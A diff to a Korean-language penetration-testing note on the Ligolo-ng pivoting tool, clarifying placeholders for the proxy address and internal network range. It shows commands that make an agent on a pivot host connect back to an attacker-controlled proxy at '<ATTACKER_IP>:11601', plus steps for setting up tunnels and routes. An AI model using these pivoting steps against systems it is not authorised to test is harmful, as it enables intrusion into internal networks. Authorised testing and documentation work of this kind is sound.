@@ -19,13 +19,14 @@ Ligolo-ng는 피벗 호스트의 에이전트와 공격 호스트의 TUN 인터�
 - 필요한 입력: agent가 연결할 proxy 주소/포트, 피벗 뒤 내부 대역, 생성할 TUN interface와 route
 - 권한 조건: 공격 호스트의 TUN 생성 권한과 피벗 호스트의 agent 실행 권한
 - 환경 조건: 양단 버전을 맞추고 인증서 방식과 reverse 연결 경로를 확인한다.
+- `<PROXY_IP>`는 agent가 연결할 공격 host, `<INTERNAL_CIDR>`은 pivot 관점에서 도달 가능한 대역(예: `198.51.100.0/24`)이며 TUN interface와 route는 proxy host에 만든다. agent session 생성은 최종 내부 TCP 응답을 뜻하지 않는다.
 
 
 ## 표준 사용법
 
 ```bash
 ./proxy -selfcert
-./agent -connect <proxy_ip>:11601 -ignore-cert
+./agent -connect <PROXY_IP>:11601 -ignore-cert
 ```
 
 ### v0.6+ 관리형 TUN, route, tunnel 절차
@@ -40,6 +41,8 @@ ligolo-ng » session
 proxy 전역 프롬프트에서 interface와 route를 준비한 뒤 `session`으로 agent를 선택해 tunnel을 시작한다. route를 추가하기 전 agent의 `ifconfig`로 실제 내부 CIDR을 확인한다.
 
 ## 대표 예시
+
+`<PROXY_IP>`는 agent가 연결할 공격 호스트 주소(예: `192.0.2.10`)이고, `<INTERNAL_CIDR>`은 agent `ifconfig`에서 얻은 피벗 뒤 CIDR이다. `<AGENT>`는 `session` 출력에 나타난 agent 식별자이며 route와 TUN은 proxy 호스트에서 만든 값을 재사용한다.
 
 ### 공격자 호스트에 TUN 인터페이스 준비
 
@@ -59,7 +62,7 @@ sudo ip link set ligolo up
 ### 피벗 호스트에서 agent 연결
 
 ```bash
-./agent -connect <ATTACKER_IP>:11601 -ignore-cert
+./agent -connect <PROXY_IP>:11601 -ignore-cert
 ```
 
 ### route 추가과 터널 시작
